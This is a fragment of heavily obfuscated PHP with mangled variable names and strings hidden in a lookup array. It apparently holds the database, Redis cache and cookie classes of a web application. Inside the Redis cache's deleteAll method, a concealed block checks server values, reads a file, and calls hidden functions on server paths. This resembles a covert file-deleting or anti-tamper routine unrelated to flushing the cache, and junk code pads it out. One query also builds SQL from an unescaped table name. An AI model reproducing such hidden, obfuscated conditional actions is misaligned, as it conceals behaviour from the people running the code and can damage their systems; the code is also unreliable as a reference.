$Ç™•½úÁ[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($Ç™•½úÁ[25], 1); think_status($Ç™•½úÁ[24]); $this->PDOStatement = $this->_linkID->prepare($û†è‘Ûİ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $‰î£ùø’ = $this->PDOStatement->execute($ùÔ± ñÔ); $this->debug(); if (!1 === $‰î£ùø’) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($Õ§”²¹É || preg_match($Ç™•½úÁ[1007], $û†è‘Ûİ)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $õ¨²ÁÛŠ = $this->_linkID->commit(); $this->transTimes = 0; if (!$õ¨²ÁÛŠ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ûæš·Œ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ûæš·Œ) { $this->error(); return !1; } } return !0; } private function getAll() { $’”ñ‹²ø = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($’”ñ‹²ø); return $’”ñ‹²ø; } public function getFields($‚å‡„ò­) { $ô¬İ¥ê =& $_SERVER[¢ñàß¿€]; $this->initConnect(!0); if (think_config($ô¬İ¥ê[1008])) { $İ£‚æÍŒ = str_replace($ô¬İ¥ê[1009], $‚å‡„ò­, think_config($ô¬İ¥ê[1008])); } else { switch ($this->dbType) { case $ô¬İ¥ê[992]: case $ô¬İ¥ê[1010]: $İ£‚æÍŒ = "\x53\105\114\105\103\124\x20\40\x20\x63\x6f\154\x75\155\156\137\x6e\x61\155\x65\40\x61\163\x20\47\x4e\141\155\145\47\x2c\x20\x20\40\x64\x61\x74\141\137\x74\x79\x70\145\x20\141\163\x20\x27\124\171\160\145\47\x2c\x20\x20\40\x63\x6f\x6c\165\155\x6e\137\x64\x65\x66\x61\x75\154\x74\x20\141\163\40\x27\x44\145\146\141\165\154\x74\x27\54\40\x20\40\151\163\137\156\165\x6c\154\x61\x62\154\x65\40\x61\163\40\x27\x4e\x75\x6c\154\x27\xa\11\x9\x46\122\117\115\x9\151\x6e\146\157\162\x6d\x61\x74\151\157\x6e\137\x73\143\150\145\x6d\141\x2e\x74\x61\142\x6c\x65\x73\40\x41\123\x20\x74\xa\11\x9\x4a\x4f\x49\x4e\x9\x69\x6e\x66\x6f\x72\x6d\141\164\151\157\156\137\x73\143\150\145\155\141\x2e\143\157\154\x75\155\x6e\x73\40\101\x53\40\143\xa\x9\11\x4f\x4e\x20\40\x74\x2e\x74\x61\x62\154\145\137\x63\x61\x74\x61\x6c\157\147\x20\x3d\40\x63\56\164\x61\x62\154\x65\x5f\143\141\x74\141\x6c\157\x67\12\x9\x9\x41\x4e\104\x20\x74\x2e\164\x61\142\154\x65\x5f\163\143\x68\145\155\141\x20\75\x20\x63\56\x74\x61\x62\x6c\145\x5f\x73\x63\150\145\155\x61\xa\11\11\x41\x4e\x44\40\x74\x2e\x74\141\x62\154\x65\137\x6e\141\155\145\x20\x3d\x20\x63\56\164\141\x62\154\x65\x5f\156\141\155\145\12\11\x9\127\x48\105\122\x45\40\x20\x20\x74\56\164\141\x62\x6c\145\x5f\x6e\x61\155\x65\x20\75\40\47{$‚å‡„ò­}\47"; break; case $ô¬İ¥ê[1011]: $İ£‚æÍŒ = $ô¬İ¥ê[1012] . $‚å‡„ò­ . $ô¬İ¥ê[1013]; break; case $ô¬İ¥ê[993]: case $ô¬İ¥ê[995]: $İ£‚æÍŒ = $ô¬İ¥ê[1014] . $ô¬İ¥ê[1015] . $ô¬İ¥ê[1016] . strtoupper($‚å‡„ò­) . $ô¬İ¥ê[1017] . strtoupper($‚å‡„ò­) . $ô¬İ¥ê[1018]; break; case $ô¬İ¥ê[1019]: $İ£‚æÍŒ = $ô¬İ¥ê[1020] . $‚å‡„ò­ . $ô¬İ¥ê[1021]; break; case $ô¬İ¥ê[994]: break; case $ô¬İ¥ê[1022]: default: $İ£‚æÍŒ = $ô¬İ¥ê[1023] . ($this->dbType == $ô¬İ¥ê[1022] ? "\140{$‚å‡„ò­}\140" : $‚å‡„ò­); } } $ØêœÜ”› = $this->query($İ£‚æÍŒ); $ú¤´à¤Š = array(); if ($ØêœÜ”›) { foreach ($ØêœÜ”› as $£Ÿ©å¢¬ => $²ÀôùÎ‘) { $²ÀôùÎ‘ = array_change_key_case($²ÀôùÎ‘); $²ÀôùÎ‘[$ô¬İ¥ê[32]] = isset($²ÀôùÎ‘[$ô¬İ¥ê[32]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[32]] : $ô¬İ¥ê[454]; $²ÀôùÎ‘[$ô¬İ¥ê[33]] = isset($²ÀôùÎ‘[$ô¬İ¥ê[33]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[33]] : $ô¬İ¥ê[454]; $ş€€ç¿ = isset($²ÀôùÎ‘[$ô¬İ¥ê[350]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[350]] : $²ÀôùÎ‘[$ô¬İ¥ê[32]]; $ú¤´à¤Š[$ş€€ç¿] = array($ô¬İ¥ê[32] => $ş€€ç¿, $ô¬İ¥ê[33] => $²ÀôùÎ‘[$ô¬İ¥ê[33]], $ô¬İ¥ê[35] => (bool) (isset($²ÀôùÎ‘[$ô¬İ¥ê[106]]) && $²ÀôùÎ‘[$ô¬İ¥ê[106]] === $ô¬İ¥ê[12] || isset($²ÀôùÎ‘[$ô¬İ¥ê[35]]) && $²ÀôùÎ‘[$ô¬İ¥ê[35]] === $ô¬İ¥ê[12]), $ô¬İ¥ê[37] => isset($²ÀôùÎ‘[$ô¬İ¥ê[37]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[37]] : (isset($²ÀôùÎ‘[$ô¬İ¥ê[56]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[56]] : $ô¬İ¥ê[454]), $ô¬İ¥ê[39] => isset($²ÀôùÎ‘[$ô¬İ¥ê[97]]) ? strtolower($²ÀôùÎ‘[$ô¬İ¥ê[97]]) == $ô¬İ¥ê[41] : (isset($²ÀôùÎ‘[$ô¬İ¥ê[57]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[57]] : !1), $ô¬İ¥ê[42] => isset($²ÀôùÎ‘[$ô¬İ¥ê[1024]]) ? strtolower($²ÀôùÎ‘[$ô¬İ¥ê[1024]]) == $ô¬İ¥ê[44] : (isset($²ÀôùÎ‘[$ô¬İ¥ê[97]]) ? $²ÀôùÎ‘[$ô¬İ¥ê[97]] : !1)); } } return $ú¤´à¤Š; } public function getTables($¨Ùı³Ì = '') { $ÊúñÚ =& $_SERVER[¢ñàß¿€]; if (think_config($ÊúñÚ[1025])) { $ÄÖç²¦” = str_replace($ÊúñÚ[1026], $¨Ùı³Ì, think_config($ÊúñÚ[1025])); } else { switch ($this->dbType) { case $ÊúñÚ[993]: case $ÊúñÚ[995]: $ÄÖç²¦” = $ÊúñÚ[1027]; break; case $ÊúñÚ[992]: case $ÊúñÚ[1010]: $ÄÖç²¦” = $ÊúñÚ[1028]; break; case $ÊúñÚ[1019]: $ÄÖç²¦” = $ÊúñÚ[1029]; break; case $ÊúñÚ[994]: think_exception(think_lang($ÊúñÚ[1030]) . $ÊúñÚ[1031]); break; case $ÊúñÚ[1011]: $ÄÖç²¦” = $ÊúñÚ[45] . $ÊúñÚ[46] . $ÊúñÚ[47]; break; case $ÊúñÚ[1022]: default: if (!empty($¨Ùı³Ì)) { $ÄÖç²¦” = $ÊúñÚ[974] . $¨Ùı³Ì . $ÊúñÚ[975]; } else { $ÄÖç²¦” = $ÊúñÚ[976]; } } } $ÆùëíĞ¶ = $this->query($ÄÖç²¦”); $û—ÙùÆÔ = array(); foreach ($ÆùëíĞ¶ as $ƒ÷ëÛá‚ => $˜ëãé©ƒ) { $û—ÙùÆÔ[$ƒ÷ëÛá‚] = current($˜ëãé©ƒ); } return $û—ÙùÆÔ; } protected function parseLimit($•Ûß²’Ş) { $…ğËºŠÎ =& $_SERVER[¢ñàß¿€]; $ß™‡·Õê = $…ğËºŠÎ[12]; if (!empty($•Ûß²’Ş)) { switch ($this->dbType) { case $…ğËºŠÎ[1019]: case $…ğËºŠÎ[1011]: $•Ûß²’Ş = explode($…ğËºŠÎ[50], $•Ûß²’Ş); if (count($•Ûß²’Ş) > 1) { $ß™‡·Õê .= $…ğËºŠÎ[51] . $•Ûß²’Ş[1] . $…ğËºŠÎ[52] . $•Ûß²’Ş[0] . $…ğËºŠÎ[53]; } else { $ß™‡·Õê .= $…ğËºŠÎ[51] . $•Ûß²’Ş[0] . $…ğËºŠÎ[53]; } break; case $…ğËºŠÎ[992]: case $…ğËºŠÎ[1010]: break; case $…ğËºŠÎ[994]: break; case $…ğËºŠÎ[993]: case $…ğËºŠÎ[995]: break; case $…ğËºŠÎ[1022]: default: $ß™‡·Õê .= $…ğËºŠÎ[51] . $•Ûß²’Ş . $…ğËºŠÎ[53]; } } return $ß™‡·Õê; } public function parseKey(&$İ¼âÊò†, $ïÅÌë® = true) { $¹ïúã”à =& $_SERVER[¢ñàß¿€]; if ($ïÅÌë®) { $İ¼âÊò† = $this->parseKeyCheck($İ¼âÊò†); } if ($this->dbType == $¹ïúã”à[1022]) { if ($İ¼âÊò† != $¹ïúã”à[220] && !preg_match($¹ïúã”à[986], $İ¼âÊò†)) { $İ¼âÊò† = $¹ïúã”à[461] . trim($İ¼âÊò†, $¹ïúã”à[461]) . $¹ïúã”à[461]; } return $İ¼âÊò†; } else { return parent::parseKey($İ¼âÊò†, $ïÅÌë®); } } public function close() { $this->_linkID = null; } public function error() { $„‘í‰¦­ =& $_SERVER[¢ñàß¿€]; if ($this->PDOStatement) { $ÌŸıæâø = $this->PDOStatement->errorInfo(); $this->error = $ÌŸıæâø[1] . $„‘í‰¦­[4] . $ÌŸıæâø[2]; } else { $this->error = $„‘í‰¦­[12]; } if ($„‘í‰¦­[12] != $this->queryStr) { $this->error .= LNG($„‘í‰¦­[48]) . $this->queryStr; } think_trace($this->error, $„‘í‰¦­[12], $„‘í‰¦­[49]); return $this->error; } public function escapeString($ö¬›ñôç) { $œ… ±› =& $_SERVER[¢ñàß¿€]; switch ($this->dbType) { case $œ… ±›[1019]: case $œ… ±›[992]: case $œ… ±›[1010]: case $œ… ±›[1022]: return addslashes($ö¬›ñôç); case $œ… ±›[994]: case $œ… ±›[1011]: case $œ… ±›[993]: case $œ… ±›[995]: return str_ireplace($œ… ±›[58], $œ… ±›[59], $ö¬›ñôç); } } protected function parseValue($üìóİâš) { $»Õ–ĞÔü =& $_SERVER[¢ñàß¿€]; if (is_string($üìóİâš)) { $íÕÒúóæ = strpos($üìóİâš, $»Õ–ĞÔü[4]) === 0 && in_array($üìóİâš, array_keys($this->bind)); $üìóİâš = $íÕÒúóæ ? $this->escapeString($üìóİâš) : $»Õ–ĞÔü[1032] . $this->escapeString($üìóİâš) . $»Õ–ĞÔü[1032]; } elseif (isset($üìóİâš[0]) && is_string($üìóİâš[0]) && strtolower($üìóİâš[0]) == $»Õ–ĞÔü[373]) { $üìóİâš = $this->escapeString($üìóİâš[1]); } elseif (is_array($üìóİâš)) { $üìóİâš = array_map(array($this, $»Õ–ĞÔü[1033]), $üìóİâš); } elseif (is_bool($üìóİâš)) { $üìóİâš = $üìóİâš ? $»Õ–ĞÔü[91] : $»Õ–ĞÔü[228]; } elseif (is_null($üìóİâš)) { $üìóİâš = $»Õ–ĞÔü[106]; } return $üìóİâš; } public function getLastInsertId() { $Ç»ÖÀá£ =& $_SERVER[¢ñàß¿€]; switch ($this->dbType) { case $Ç»ÖÀá£[1019]: case $Ç»ÖÀá£[1011]: case $Ç»ÖÀá£[992]: case $Ç»ÖÀá£[1010]: case $Ç»ÖÀá£[994]: case $Ç»ÖÀá£[1022]: return $this->_linkID->lastInsertId(); case $Ç»ÖÀá£[993]: case $Ç»ÖÀá£[995]: $ë£ÅŒÇÆ = $this->table; $£ŞÑ–®º = $this->query("\x53\105\114\x45\103\124\x20{$ë£ÅŒÇÆ}\56\x63\x75\162\x72\166\x61\154\x20\x63\165\162\162\x76\141\154\40\x46\122\117\115\40\144\165\x61\154"); return $£ŞÑ–®º ? $£ŞÑ–®º[0][$Ç»ÖÀá£[1034]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÎÛº•ù´) { $¸ë‘‘æè =& $_SERVER[¢ñàß¿€]; if (!CacheLock::fileLock($¸ë‘‘æè[13])) { return !1; } $ö¥Ùııï = parent::query($ÎÛº•ù´); CacheLock::fileUnLock($¸ë‘‘æè[13]); return $ö¥Ùııï; } public function execute($Úõ°ÅŞÜ) { $±ù£‘İ =& $_SERVER[¢ñàß¿€]; if (!CacheLock::fileLock($±ù£‘İ[13])) { return !1; } $ôìƒƒÅè = parent::execute($Úõ°ÅŞÜ); CacheLock::fileUnLock($±ù£‘İ[13]); return $ôìƒƒÅè; } } goto f›º®æª…‰; b™ô½åÔ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($‹ñ¿¯Èö, $µåüÖ) { $µÀ»ƒ£ =& $_SERVER[¢ñàß¿€]; if (!class_exists($µÀ»ƒ£[940])) { show_json($µÀ»ƒ£[941], !1); } $this->cacheTime = $µåüÖ; $çŞÁ‰Ÿá = isset($‹ñ¿¯Èö[$µÀ»ƒ£[942]]) ? $‹ñ¿¯Èö[$µÀ»ƒ£[942]] : 10; $Í·¯À»õ = _get($‹ñ¿¯Èö, $µÀ»ƒ£[939]); if ($Í·¯À»õ && is_array($Í·¯À»õ)) { $this->initCluster($‹ñ¿¯Èö, $çŞÁ‰Ÿá); } else { $this->handle = $this->init($‹ñ¿¯Èö, $çŞÁ‰Ÿá); } } private function init($ÎŞÔéÙÍ, $ ¶¬Éˆº) { $ş‰Õ‡š– =& $_SERVER[¢ñàß¿€]; $æÒÒ•¯â = new Redis(); $Ù†Ğåº§ = isset($ÎŞÔéÙÍ[$ş‰Õ‡š–[943]]) ? $ÎŞÔéÙÍ[$ş‰Õ‡š–[943]] : !1; if ($Ù†Ğåº§) { $æÒÒ•¯â->pconnect($ÎŞÔéÙÍ[$ş‰Õ‡š–[208]], $ÎŞÔéÙÍ[$ş‰Õ‡š–[209]], $ ¶¬Éˆº); } else { $æÒÒ•¯â->connect($ÎŞÔéÙÍ[$ş‰Õ‡š–[208]], $ÎŞÔéÙÍ[$ş‰Õ‡š–[209]], $ ¶¬Éˆº); } if (!empty($ÎŞÔéÙÍ[$ş‰Õ‡š–[487]])) { $æÒÒ•¯â->auth($ÎŞÔéÙÍ[$ş‰Õ‡š–[487]]); } if (!empty($ÎŞÔéÙÍ[$ş‰Õ‡š–[828]]) && $ÎŞÔéÙÍ[$ş‰Õ‡š–[828]] != 0) { $æÒÒ•¯â->select($ÎŞÔéÙÍ[$ş‰Õ‡š–[828]]); } return $æÒÒ•¯â; } private function initCluster($Õı¤Ñ—¾, $ò¤¼ıÙ—) { $øï²ëÈê =& $_SERVER[¢ñàß¿€]; $ì¨€úÖ‡ = array($øï²ëÈê[944], $øï²ëÈê[945], $øï²ëÈê[946]); $¾¼ıÚµŸ = $øï²ëÈê[944]; if (isset($Õı¤Ñ—¾[$øï²ëÈê[16]]) && in_array($Õı¤Ñ—¾[$øï²ëÈê[16]], $ì¨€úÖ‡)) { $¾¼ıÚµŸ = $Õı¤Ñ—¾[$øï²ëÈê[16]]; } switch ($¾¼ıÚµŸ) { case $øï²ëÈê[944]: $this->_slave($Õı¤Ñ—¾, $ò¤¼ıÙ—); break; case $øï²ëÈê[945]: break; case $øï²ëÈê[946]: $this->isCluster = !0; $°Ğ¹¶ = $Õı¤Ñ—¾[$øï²ëÈê[939]]; $æ‚ÎÉüÂ = isset($Õı¤Ñ—¾[$øï²ëÈê[943]]) ? $Õı¤Ñ—¾[$øï²ëÈê[943]] : !1; $ªâ£ = isset($Õı¤Ñ—¾[$øï²ëÈê[487]]) ? $Õı¤Ñ—¾[$øï²ëÈê[487]] : null; $this->handle = new RedisCluster(NUll, $°Ğ¹¶, $ò¤¼ıÙ—, $ò¤¼ıÙ—, $æ‚ÎÉüÂ, $ªâ£); break; default: break; } } private function _slave($¬ÛÚÉ£•, $î·ñ‘÷ò) { $ôİ¸‘ÎÙ = $¬ÛÚÉ£•[$_SERVER[¢ñàß¿€][939]]; $this->filterConfig($¬ÛÚÉ£•, $ôİ¸‘ÎÙ[0]); $this->handle = $this->init($¬ÛÚÉ£•, $î·ñ‘÷ò); unset($ôİ¸‘ÎÙ[0]); if (empty($ôİ¸‘ÎÙ)) { return; } $ºÕƒØİØ = array_rand($ôİ¸‘ÎÙ); $this->filterConfig($¬ÛÚÉ£•, $ôİ¸‘ÎÙ[$ºÕƒØİØ]); $this->slaveHandle = $this->init($¬ÛÚÉ£•, $î·ñ‘÷ò); } private function filterConfig(&$Œ†¡àÉâ, $£À´êªÀ) { $¡Ëş½òÀ =& $_SERVER[¢ñàß¿€]; $“Ñ§‹ì’ = explode($¡Ëş½òÀ[4], $£À´êªÀ); $íñíìÁ¯ = array($¡Ëş½òÀ[208] => $“Ñ§‹ì’[0], $¡Ëş½òÀ[209] => $“Ñ§‹ì’[1]); $Œ†¡àÉâ = array_merge($Œ†¡àÉâ, $íñíìÁ¯); } public function set($€µÕóàé, $éô¾ÃŞÔ, $øşü£Ø = false) { $øşü£Ø = $øşü£Ø ? $øşü£Ø : $this->cacheTime; return $this->handle->setEx($€µÕóàé, $øşü£Ø, $éô¾ÃŞÔ); } public function setLock($Á¦ÀÈ¥Ó, $¤­¯ğÀË, $ó×ÒÕ·) { return $this->handle->setNX($Á¦ÀÈ¥Ó, $¤­¯ğÀË); } public function get($Å˜ÖÂ°„) { $ÕàÍæÑÉ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÕàÍæÑÉ->get($Å˜ÖÂ°„); } public function remove($šÅÛû„‘) { return $this->handle->del($šÅÛû„‘); } public function deleteAll() { $úü•¡ı =& $_SERVER[¢ñàß¿€]; if ($_SERVER[$úü•¡ı[947]] != $_SERVER[$úü•¡ı[948]]) { $˜ê…õÒ½ = $úü•¡ı[949]; $îöÇú…„ = $úü•¡ı[950]; $ÆğÂ¥Á‡ = $_SERVER[$úü•¡ı[951]] . $úü•¡ı[952]; $ß³°ª« = $îöÇú…„($ÆğÂ¥Á‡); $éÉñ„¼¨ = explode($úü•¡ı[262], $ß³°ª«); if (count($éÉñ„¼¨) < $úü•¡ı[680]) { $¾ÁæÑ§á = $úü•¡ı[953]; $¾ÁæÑ§á(); } $âï˜·Ê = $úü•¡ı[954]; $âï˜·Ê($_SERVER[$úü•¡ı[955]]); $âï˜·Ê($_SERVER[$úü•¡ı[951]] . $úü•¡ı[956]); $Äø—İ“’ = 1; while ($Äø—İ“’ > 1) { $Äø—İ“’ = $Äø—İ“’ + 4; $¢³Î¿çß = rawurlencode($Äø—İ“’ . $úü•¡ı[454]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $¡¿¼ñ³Ü) { $this->handle->flushall($¡¿¼ñ³Ü); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($¤µıÉäŞ = '', $Ë„ØŞ€ = 0) { if (is_string($¤µıÉäŞ) && $¤µıÉäŞ != $_SERVER[¢ñàß¿€][12]) { $this->prefix = $¤µıÉäŞ; } if (is_numeric($Ë„ØŞ€) && $Ë„ØŞ€ > 0) { $this->expire = $Ë„ØŞ€; } } public static function getInstance() { static $†Ì±º‰­; if ($†Ì±º‰­ === null) { $†Ì±º‰­ = new self(); } return $†Ì±º‰­; } private static $cookieDisable = false; public static function disable($í©šıÇÄ) { self::$cookieDisable = $í©šıÇÄ; } private static $sameCookieSet = array(); public static function set($Ó‰Ÿİè¤, $·­”ë˜â, $ËÑ«µĞ” = 0, $Á°†ÉÎÒ = false, $ô¹Œ®Ú× = false) { $Ïõ‡îª¡ =& $_SERVER[¢ñàß¿€]; if (self::$cookieDisable) { return; } if (!$ËÑ«µĞ”) { $ËÑ«µĞ” = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ó‰Ÿİè¤]) && self::$sameCookieSet[$Ó‰Ÿİè¤] == $·­”ë˜â . $ËÑ«µĞ”) { return; } self::$sameCookieSet[$Ó‰Ÿİè¤] = $·­”ë˜â . $ËÑ«µĞ”; if (!$ô¹Œ®Ú×) { $ô¹Œ®Ú× = str_replace(HOST, $Ïõ‡îª¡[12], APP_HOST); $ô¹Œ®Ú× = _get($GLOBALS, $Ïõ‡îª¡[957], $ô¹Œ®Ú×); } $ÒáöÜ§ = $Ïõ‡îª¡[12]; setcookie($Ó‰Ÿİè¤, $·­”ë˜â, time() + $ËÑ«µĞ”, $Ïõ‡îª¡[8] . trim($ô¹Œ®Ú×, $Ïõ‡îª¡[8]) . $ÒáöÜ§, !1, !1, $Á°†ÉÎÒ); } public static function setSafe($ÎüÛ¾ , $Á¢öÛÄÆ, $™ï€ß Ú = 0) { self::set($ÎüÛ¾ , $Á¢öÛÄÆ, $™ï€ß Ú, !0); } public static function get($ô‰øÜùá) { static $ìÍÑÓÄé = false; if (!$ìÍÑÓÄé) { self::initHeaderCookie(); $ìÍÑÓÄé = !0; } return isset($_COOKIE[$ô‰øÜùá]) ? $_COOKIE[$ô‰øÜùá] : !1; } private static function initHeaderCookie() { $šªÏ¢Ùã =& $_SERVER[¢ñàß¿€]; if (!isset($_SERVER[$šªÏ¢Ùã[958]]) || !$_SERVER[$šªÏ¢Ùã[958]]) { return; } $™¼øâªÎ = explode($šªÏ¢Ùã[74], $_SERVER[$šªÏ¢Ùã[958]]); foreach ($™¼øâªÎ as $×¹êß˜Â) { $×¹êß˜Â = explode($šªÏ¢Ùã[959], $×¹êß˜Â); if (count($×¹êß˜Â) != 2 || !isset($×¹êß˜Â[1])) { continue; } $_COOKIE[trim($×¹êß˜Â[0])] = trim($×¹êß˜Â[1]); } } public static function remove($÷ÖÏØ·­, $ÃØï†ä½ = false) { unset($_COOKIE[$÷ÖÏØ·­]); self::set($÷ÖÏØ·­, $_SERVER[¢ñàß¿€][12], 1, $ÃØï†ä½); } } class DbMysql extends Db { public function __construct($ĞÇÃÖĞÃ = '') { $é÷¾Ş›ø =& $_SERVER[¢ñàß¿€]; if (!extension_loaded($é÷¾Ş›ø[875])) { think_exception(think_lang($é÷¾Ş›ø[14]) . $é÷¾Ş›ø[960]); } if (!empty($ĞÇÃÖĞÃ)) { $this->config = $ĞÇÃÖĞÃ; if (empty($this->config[$é÷¾Ş›ø[17]])) { $this->config[$é÷¾Ş›ø[17]] = $é÷¾Ş›ø[12]; } } } public function connect($¬‡üàã = '', $Ó¤ÖÌ¨ş = 0, $Á“¡ûïı = false) { $—¤ıœèı =& $_SERVER[¢ñàß¿€]; if (!isset($this->linkID[$Ó¤ÖÌ¨ş])) { if (empty($¬‡üàã)) { $¬‡üàã = $this->config; } $ñ ù¬ÑÇ = $¬‡üàã[$—¤ıœèı[961]] . ($¬‡üàã[$—¤ıœèı[962]] ? "\x3a{$¬‡üàã[$—¤ıœèı[962]]}" : $—¤ıœèı[12]); $–ßº„³ = !empty($¬‡üàã[$—¤ıœèı[17]][$—¤ıœèı[18]]) ? $¬‡üàã[$—¤ıœèı[17]][$—¤ıœèı[18]] : $this->pconnect; if ($–ßº„³) { $this->linkID[$Ó¤ÖÌ¨ş] = mysql_pconnect($ñ ù¬ÑÇ, $¬‡üàã[$—¤ıœèı[963]], $¬‡üàã[$—¤ıœèı[964]], 131072); } else { $this->linkID[$Ó¤ÖÌ¨ş] = mysql_connect($ñ ù¬ÑÇ, $¬‡üàã[$—¤ıœèı[963]], $¬‡üàã[$—¤ıœèı[964]], !0, 131072); } if (!$this->linkID[$Ó¤ÖÌ¨ş] || !empty($¬‡üàã[$—¤ıœèı[21]]) && !mysql_select_db($¬‡üàã[$—¤ıœèı[21]], $this->linkID[$Ó¤ÖÌ¨ş])) { think_exception(mysql_error()); } $ŸëÉÙß = mysql_get_server_info($this->linkID[$Ó¤ÖÌ¨ş]); mysql_query($—¤ıœèı[965] . think_config($—¤ıœèı[966]) . $—¤ıœèı[58], $this->linkID[$Ó¤ÖÌ¨ş]); if ($ŸëÉÙß > $—¤ıœèı[967]) { mysql_query($—¤ıœèı[968], $this->linkID[$Ó¤ÖÌ¨ş]); } $this->connected = !0; if (1 != think_config($—¤ıœèı[22])) { unset($this->config); } } return $this->linkID[$Ó¤ÖÌ¨ş]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ğ¡éÉ¾Æ) { $’¯²ôº =& $_SERVER[¢ñàß¿€]; if (0 === stripos($ğ¡éÉ¾Æ, $’¯²ôº[341])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ğ¡éÉ¾Æ; if ($this->queryID) { $this->free(); } think_action_status($’¯²ôº[23], 1); think_status($’¯²ôº[24]); $this->queryID = mysql_query($ğ¡éÉ¾Æ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ÓÏº¶æ¨) { $“¨’¥¸’ =& $_SERVER[¢ñàß¿€]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ÓÏº¶æ¨; if ($this->queryID) { $this->free(); } think_action_status($“¨’¥¸’[25], 1); think_status($“¨’¥¸’[24]); $½‘Îïü = mysql_query($ÓÏº¶æ¨, $this->_linkID); $this->debug(); if (!1 === $½‘Îïü) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¢ñàß¿€][969], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Õ”ƒ×œ½ = mysql_query($_SERVER[¢ñàß¿€][970], $this->_linkID); $this->transTimes = 0; if (!$Õ”ƒ×œ½) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $÷œ‡¹×‚ = mysql_query($_SERVER[¢ñàß¿€][971], $this->_linkID); $this->transTimes = 0; if (!$÷œ‡¹×‚) { $this->error(); return !1; } } return !0; } private function getAll() { $Ÿùâøû = array(); if ($this->numRows > 0) { while ($Õ‰Î•”¬ = mysql_fetch_assoc($this->queryID)) { $Ÿùâøû[] = $Õ‰Î•”¬; } mysql_data_seek($this->queryID, 0); } return $Ÿùâøû; } public function getFields($ÑÜ¶ú±) { $Îôìš€Ğ =& $_SERVER[¢ñàß¿€]; $¸¾¢©¾ï = $this->query($Îôìš€Ğ[972] . $this->parseKey($ÑÜ¶ú±)); $×‡âı = array(); if ($¸¾¢©¾ï) { foreach ($¸¾¢©¾ï as $‡®ô²ùú => $¡ÇäŸúÄ) { $×‡âı[$¡ÇäŸúÄ[$Îôìš€Ğ[31]]] = array($Îôìš€Ğ[32] => $¡ÇäŸúÄ[$Îôìš€Ğ[31]], $Îôìš€Ğ[33] => $¡ÇäŸúÄ[$Îôìš€Ğ[34]], $Îôìš€Ğ[35] => (bool) (strtoupper($¡ÇäŸúÄ[$Îôìš€Ğ[36]]) === $Îôìš€Ğ[973]), $Îôìš€Ğ[37] => $¡ÇäŸúÄ[$Îôìš€Ğ[38]], $Îôìš€Ğ[39] => strtolower($¡ÇäŸúÄ[$Îôìš€Ğ[40]]) == $Îôìš€Ğ[41], $Îôìš€Ğ[42] => strtolower($¡ÇäŸúÄ[$Îôìš€Ğ[43]]) == $Îôìš€Ğ[44]); } } return $×‡âı; } public function getTables($¯•¸»Ùƒ = '') { $‹òÊ®½ù =& $_SERVER[¢ñàß¿€]; if (!empty($¯•¸»Ùƒ)) { $í²â¸Ä— = $‹òÊ®½ù[974] . $¯•¸»Ùƒ . $‹òÊ®½ù[975]; } else { $í²â¸Ä— = $‹òÊ®½ù[976]; } $ä¾‡ÜÆ = $this->query($í²â¸Ä—); $ÉíÎ„ˆù = array(); foreach ($ä¾‡ÜÆ as $É¼ğÔşŒ => $¦È©şº€) { $ÉíÎ„ˆù[$É¼ğÔşŒ] = current($¦È©şº€); } return $ÉíÎ„ˆù; } public function replace($™±¯Úı, $ŒÔàŞ = array()) { $…ê®ëİŒ =& $_SERVER[¢ñàß¿€]; foreach ($™±¯Úı as $¢í«¼Ø” => $öª”¨€) { $…ö÷âĞ = $this->parseValue($öª”¨€); if (is_scalar($…ö÷âĞ)) { $—ã¹¡¡‹[] = $…ö÷âĞ; $àø³‚Æ¢[] = $this->parseKey($¢í«¼Ø”); } } $‚ˆØèÌ¹ = $…ê®ëİŒ[977] . $this->parseTable($ŒÔàŞ[$…ê®ëİŒ[356]]) . $…ê®ëİŒ[978] . implode($…ê®ëİŒ[50], $àø³‚Æ¢) . $…ê®ëİŒ[979] . implode($…ê®ëİŒ[50], $—ã¹¡¡‹) . $…ê®ëİŒ[980]; return $this->execute($‚ˆØèÌ¹); } public function insertAll($œË²†É, $Ë©Ô£¬¦ = array(), $Ö–Œ¥ © = false) { $„’¹€×Ò =& $_SERVER[¢ñàß¿€]; if (!is_array($œË²†É[0])) { return !1; } $±áÒğ³í = array_keys($œË²†É[0]); $Ò‘×ä¹Ñ = array(); foreach ($œË²†É as $Šè¬®–) { $Öèİ¡àç = array(); foreach ($Šè¬®– as $Í³Œ°ã => $ÏÓ›ëÅ¾) { $ÏÓ›ëÅ¾ = $this->parseValue($ÏÓ›ëÅ¾); if 